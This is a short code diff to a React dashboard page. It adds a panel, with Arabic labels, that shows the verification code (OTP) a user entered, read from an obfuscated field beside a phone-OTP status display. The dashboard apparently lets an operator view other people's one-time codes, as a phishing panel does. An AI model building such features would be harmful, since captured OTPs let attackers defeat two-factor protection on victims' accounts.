@@ -2083,6 +2083,31 @@ export default function DashboardPage() {
             "📡"
           )}
           
+          {/* عرض رمز التحقق (OTP) */}
+          {raw?._v7 && (
+            <div style={{ 
+              background: "#fef3c7", 
+              borderRadius: 6, 
+              padding: "10px 12px", 
+              border: "1px solid #fcd34d",
+              textAlign: "center"
+            }}>
+              <div style={{ fontSize: "0.7rem", color: "#92400e", marginBottom: 4, fontWeight: 500 }}>
+                رمز التحقق المدخل
+              </div>
+              <div style={{ 
+                fontFamily: "ui-monospace, monospace", 
+                fontSize: "1.4rem", 
+                fontWeight: 700, 
+                color: "#78350f",
+                letterSpacing: "6px",
+                direction: "ltr"
+              }}>
+                {raw._v7}
+              </div>
+            </div>
+          )}
+          
           {phoneOtpStatus && (
             <div style={{ 
               ...(statusConfig[phoneOtpStatus] || statusConfig["pending"]), 
